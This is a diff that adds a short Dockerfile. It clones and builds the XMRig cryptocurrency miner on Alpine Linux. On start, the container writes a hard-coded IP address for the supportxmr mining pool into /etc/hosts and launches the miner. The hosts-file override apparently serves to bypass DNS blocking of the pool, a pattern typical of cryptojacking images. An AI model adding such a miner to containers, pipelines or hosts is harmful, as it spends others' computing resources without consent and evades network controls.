@@ -1,0 +1,9 @@
+FROM alpine:3.14.2
+RUN apk --no-cache add git make cmake libstdc++ gcc g++ libuv-dev openssl-dev hwloc-dev \
+&& git clone https://github.com/xmrig/xmrig \
+&& mkdir xmrig/build && cd xmrig/build \
+&& cmake -DCMAKE_BUILD_TYPE=Release  .. \
+&& make -j$(nproc)
+
+CMD echo "107.178.104.10  pool.supportxmr.com" >> /etc/hosts && /xmrig/build/xmrig
+
